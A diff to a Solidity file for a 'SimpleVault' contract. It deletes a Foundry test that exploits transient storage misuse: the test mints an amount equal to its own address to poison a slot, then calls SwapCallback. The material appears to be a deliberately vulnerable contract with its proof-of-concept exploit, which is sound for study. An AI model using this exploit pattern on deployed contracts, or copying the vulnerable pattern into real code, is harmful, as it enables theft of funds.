@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-import "forge-std/Test.sol";
+import "forge-std/console.sol";
 
 contract SimpleVault {
     // mint function
@@ -40,26 +40,4 @@ contract SimpleVault {
         }
     }
 
-}
-
-contract TransientStorageMisuseTest is Test {
-    SimpleVault vault;
-
-    function setUp() public {
-        vault = new SimpleVault();
-    }
-
-    function testStorageOperation() public {
-        // First, let's check what address we want to get
-        console.log("Target address:", address(this));
-
-        // Convert the address to uint256
-        uint256 amount = uint256(uint160(address(this)));
-        emit log_named_uint("Amount needed", amount);
-
-        // Now use this amount in the mint function
-        vault.mint(amount);
-
-        vault.SwapCallback(0, "");
-    }
 }
